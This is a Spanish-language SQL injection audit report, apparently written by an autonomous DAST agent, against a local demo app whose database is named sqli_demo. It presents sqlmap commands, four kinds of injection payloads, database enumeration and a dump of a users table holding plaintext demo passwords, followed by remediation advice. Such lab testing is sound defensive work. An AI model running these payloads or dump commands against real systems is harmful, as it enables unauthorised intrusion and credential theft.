# Informe de Auditoría de Seguridad - SQL Injection
**Objetivo:** http://web.dev.local:8083  
**Fecha:** 2026-04-21T07:09:00Z  
**Analista:** Agente Autónomo DAST - Claude Sonnet 4.6  
**Herramientas:** curl, sqlmap 1.10.2

---

## Resumen Ejecutivo

Se realizó un análisis dinámico de seguridad (DAST) sobre la aplicación web en `http://web.dev.local:8083`. Se identificó una **vulnerabilidad crítica de SQL Injection** en el parámetro `id` del método GET. La vulnerabilidad fue explotada con éxito, logrando extraer la base de datos completa de usuarios incluyendo credenciales en texto plano.

**Nivel de riesgo:** 🔴 CRÍTICO

---

## Fase 1: Reconocimiento

### Descripción de la aplicación
La aplicación expone un único formulario en la raíz (`/`) con el título "Search user". Permite buscar usuarios por ID mediante un campo de texto.

### Vector de entrada identificado
| Método | URL | Parámetro | Tipo |
|--------|-----|-----------|------|
| GET | `http://web.dev.local:8083/` | `id` | Numérico/Texto libre |

**Ejemplo de petición legítima:**
```
GET /?id=1&Submit=Submit HTTP/1.1
Host: web.dev.local:8083
```

**Respuesta normal (id=1):**
```
ID: 1
First name: John
Surname: Doe
```

---

## Fase 2: Escaneo de Vulnerabilidades

Se ejecutó `sqlmap` sobre el parámetro `id`:

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --level=3 --risk=2
```

### Resultado: VULNERABLE ✅

sqlmap confirmó **4 tipos de inyección** en el parámetro `id`:

| Tipo | Técnica | Payload |
|------|---------|---------|
| Boolean-based blind | OR NOT clause | `id=1' OR NOT 8214=8214-- AqsF` |
| Error-based | EXTRACTVALUE (MySQL ≥ 5.1) | `id=1' AND EXTRACTVALUE(7830,CONCAT(0x5c,...))-- vHQx` |
| Time-based blind | SLEEP | `id=1' AND (SELECT 5876 FROM (SELECT(SLEEP(5)))XpeC)-- tpQt` |
| UNION query | NULL - 2 columnas | `id=1' UNION ALL SELECT CONCAT(...),NULL-- -` |

**Información del servidor:**
- **DBMS:** MySQL ≥ 5.1 (MariaDB fork)
- **OS:** Linux Debian
- **Stack:** PHP 8.1.33 + Apache 2.4.65

---

## Fase 3: Explotación Activa

### 3.1 Obtención del usuario de base de datos

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch --current-user --dbs
```

**Resultado:**
- **Usuario DB actual:** `root@%` ⚠️ (privilegios máximos)
- **Bases de datos disponibles:**
  - `information_schema`
  - `mysql`
  - `performance_schema`
  - `sqli_demo`
  - `sys`

### 3.2 Enumeración de tablas

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo --tables
```

**Resultado:**
```
Database: sqli_demo
[1 table]
+-------+
| users |
+-------+
```

### 3.3 Extracción completa de la tabla users

```bash
sqlmap -u "http://web.dev.local:8083/?id=1&Submit=Submit" -p id --batch -D sqli_demo -T users --dump
```

**Datos extraídos — EXPLOTACIÓN EXITOSA 🔴:**

| user_id | username  | first_name | last_name | email               | password    |
|---------|-----------|------------|-----------|---------------------|-------------|
| 1       | admin     | John       | Doe       | admin@example.com   | password123 |
| 2       | jsmith    | Jane       | Smith     | jane@example.com    | secret456   |
| 3       | bjohnson  | Bob        | Johnson   | bob@example.com     | mypass789   |
| 4       | awilliams | Alice      | Williams  | alice@example.com   | qwerty123   |
| 5       | cbrown    | Charlie    | Brown     | charlie@example.com | password    |
| 6       | ddavis    | Diana      | Davis     | diana@example.com   | secure123   |
| 7       | emiller   | Eve        | Miller    | eve@example.com     | hackme      |
| 8       | fwilson   | Frank      | Wilson    | frank@example.com   | admin123    |

> ⚠️ **Las contraseñas están almacenadas en texto plano**, lo que agrava gravemente el impacto.

---

## Hallazgos

### VULN-001: SQL Injection en parámetro `id` (GET)
| Campo | Detalle |
|-------|---------|
| **Severidad** | Crítica (CVSS 9.8) |
| **URL** | `http://web.dev.local:8083/?id=1&Submit=Submit` |
| **Parámetro** | `id` |
| **Tipo** | SQL Injection (Boolean-based, Error-based, Time-based, UNION) |
| **DBMS** | MySQL/MariaDB |
| **Impacto** | Acceso completo a todos los datos; usuario DB es `root` |

**Payload de prueba básico:**
```
GET /?id=1'&Submit=Submit
```

**Payload UNION exploit:**
```
GET /?id=1' UNION ALL SELECT CONCAT(0x716b787a71,...),NULL-- -&Submit=Submit
```

### VULN-002: Contraseñas almacenadas en texto plano
| Campo | Detalle |
|-------|---------|
| **Severidad** | Alta |
| **Descripción** | Las contraseñas no están hasheadas en la base de datos |
| **Impacto** | Compromiso inmediato de todas las cuentas al obtener acceso a la DB |

---

## Recomendaciones

1. **Usar Prepared Statements / Consultas parametrizadas** — Nunca concatenar input del usuario directamente en SQL.
2. **Principio de mínimo privilegio** — La aplicación no debería conectarse como `root`. Usar un usuario con permisos limitados (SELECT/INSERT según necesidad).
3. **Hashear contraseñas** — Usar `bcrypt` o `argon2` con salt único por usuario.
4. **WAF / Validación de entrada** — Implementar validación estricta de tipos (el campo `id` debería aceptar solo enteros).
5. **Manejo de errores** — No exponer mensajes de error de MySQL al cliente.

---

## Conclusión

La aplicación en `http://web.dev.local:8083` presenta una vulnerabilidad **SQL Injection crítica** completamente explotable. Un atacante sin autenticación puede:

- Extraer toda la base de datos (usuarios, contraseñas, emails)
- Leer archivos del sistema (la conexión es `root@%`)
- Potencialmente escribir webshells o modificar datos

La explotación fue demostrada exitosamente: se extrajeron **8 credenciales de usuario en texto plano** de la base de datos `sqli_demo`.

---
*Informe generado automáticamente por Agente DAST — Claude Sonnet 4.6*
